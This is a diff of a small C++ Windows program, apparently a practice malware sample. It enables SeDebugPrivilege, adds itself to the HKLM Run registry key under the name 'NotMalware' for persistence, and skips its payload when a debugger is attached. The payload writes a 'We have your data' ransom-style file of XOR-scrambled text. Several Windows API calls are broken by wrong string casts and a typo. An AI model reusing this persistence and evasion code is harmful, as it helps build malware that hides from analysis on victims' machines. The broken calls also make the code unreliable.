@@ -1,117 +1,131 @@
+#define WINVER 0x0501
+#define _WIN32_WINNT 0x0501
+#pragma managed(push, off)
+#include <windows.h>
+#include <ObjBase.h>
+#pragma managed(pop)
 #include <iostream>
 #include <fstream>
-#include <debugapi.h>
-#include <windows.h>
-#include <libloaderapi.h>
+#include <sstream>
 using namespace std;
 
-
 string Xor_OP(const char * str) {
-    const char a[5] = {'C', 'S', '5', '7', '9'};
+	const char a[5] = { 'C', 'S', '5', '7', '9' };
 
-    string rtn_s;
+	string rtn_s;
 
-    for (int i = 0; i < 5; i++) {
-        rtn_s += a[i] ^ str[i];
-    }
+	for (int i = 0; i < 5; i++) {
+		rtn_s += a[i] ^ str[i];
+	}
 
-    return rtn_s;
+	return rtn_s;
 };
 
 int malware() {
 
-    ofstream yourData("YourData.txt");
-    yourData << "Brent";
+	ofstream yourData("YourData.txt");
+	yourData << "Brent";
 
-    yourData.close();
+	yourData.close();
 
-    ifstream read_Data("YourData.txt");
+	ifstream read_Data("YourData.txt");
 
-    string s;
-    string Xor_s;
-    while (getline(read_Data, s)) {
-        Xor_s.append(Xor_OP(s.data())).append("\n");
-    };
+	string s;
+	string Xor_s;
+	while (getline(read_Data, s)) {
+		Xor_s.append(Xor_OP(s.data())).append("\n");
+	};
 
-    ofstream MyFile("MyFile.txt");
-    MyFile << "We have your data\n" + Xor_s;
-    MyFile.close();
-    return 0;
+	ofstream MyFile("MyFile.txt");
+	MyFile << "We have your data\n" << Xor_s;
+	MyFile.close();
+	return 0;
 };
 
 string get_current_WD() {
-    TCHAR buffer[MAX_PATH] = { 0 };
-    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
-    return &*buffer;
+	TCHAR buffer[MAX_PATH] = { 0 };
+	GetModuleFileNameA(nullptr, (LPSTR)buffer, MAX_PATH);
+	std:wstring wStr = buffer;
+	string str = std::string(wStr.begin(), wStr.end());
+	return str;
 }
 
 bool EnableSeDebugPrivilege()
 {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
 
-    // Open the process token
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return false;
+	// Open the process token
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		return false;
 
-    // Look up the LUID for SeDebugPrivilege
-    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
-    {
-        CloseHandle(hToken);
-        return false;
-    }
+	// Look up the LUID for SeDebugPrivilege
+	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+	{
+		CloseHandle(hToken);
+		return false;
+	}
 
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    // Apply the privilege adjustment
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
-    {
-        CloseHandle(hToken);
-        return false;
-    }
+	// Apply the privilege adjustment
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+	{
+		CloseHandle(hToken);
+		return false;
+	}
 
-    // AdjustTokenPrivileges can succeed but still fail to set the privilege
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-    {
-        CloseHandle(hToken);
-        return false;
-    }
+	// AdjustTokenPrivileges can succeed but still fail to set the privilege
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
+		CloseHandle(hToken);
+		return false;
+	}
 
-    CloseHandle(hToken);
-    return true;
+	CloseHandle(hToken);
+	return true;
 }
 
 int regedit(string filename) {
-    HKEY hKey;
-    if (int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey); res == ERROR_SUCCESS) {
+	HKEY hKey;
 
-        if (RegSetValueExW(hKey, reinterpret_cast<LPCWSTR>("NotMalware"), 0, REG_SZ, reinterpret_cast<const BYTE *>(&filename), (filename.size() + 1)))
-        {
-            cout<<"Key Not Updated"<<endl;
-            RegCloseKey(hKey);
-            return 0;
-        }
+	int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPWSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	if (res == ERROR_SUCCESS) {
 
-        RegCloseKey(hKey);
-        cout<<"Key Updated"<<endl;
-        return 1;
-    }
-    return 0;
+		if (RegSetValueExW(hKey, (LPCWSTR)"NotMalware", 0, REG_SZ, (BYTE *)&filename, (filename.size() + 1)))
+		{
+			cout << "Key Not Updated" << endl;
+			RegCloseKey(hKey);
+			return 0;
+		}
+
+		RegCloseKey(hKey);
+		cout << "Key Updated" << endl;
+		return 1;
+	}
+	return 0;
 }
 
 
 
 int main() {
-    //if (!IsDebuggerPresent()) {
-        if (EnableSeDebugPrivilege())
-            if (const string current_WD = get_current_WD(); regedit(current_WD)) {
-                malware();
-                return 0;
-            }
-        return 1;
-    //}
-    return 1;
+	if (!IsDebuggerPresent()) {
+		if (EnableSeDebugPrivilege()) {
+			const string current_WD = get_current_WD();
+			if (regedit(current_WD)) {
+				int i = 0;
+				i += 1;
+				if (i > 0)
+					malware();
+				else
+					malware();
+				return 0;
+			}
+		}
+		return 1;
+	}
+	return 1;
 }
